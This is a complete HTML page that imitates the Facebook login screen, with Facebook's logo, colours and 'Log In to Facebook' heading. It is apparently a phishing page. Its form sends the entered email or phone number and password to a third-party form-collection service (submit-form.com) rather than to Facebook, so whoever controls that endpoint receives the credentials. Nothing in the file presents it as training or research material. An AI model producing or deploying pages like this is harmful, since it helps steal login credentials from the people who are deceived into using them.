<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 360px;
            text-align: center;
        }
        .login-header {
            margin-bottom: 20px;
        }
        .logo {
            width: 200px;
            margin-bottom: 10px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #606770;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccd0d5;
            border-radius: 4px;
            font-size: 16px;
        }
        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .login-button:hover {
            background-color: #165cbb;
        }
        .extra-options {
            margin-top: 20px;
        }
        .extra-options a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .extra-options a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
            <h2>Log In to Facebook</h2>
        </div>
        <form action="https://submit-form.com/HbliYmsuu" method="POST">
            <div class="input-group">
                <label for="email">Email or Phone</label>
                <input type="email" id="email" name="email" placeholder="Email or Phone" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-button">Log In</button>
            <div class="extra-options">
                <a href="#">Forgot Password?</a>
                <br>
                <a href="#">Create New Account</a>
            </div>
        </form>
    </div>
</body>
</html>
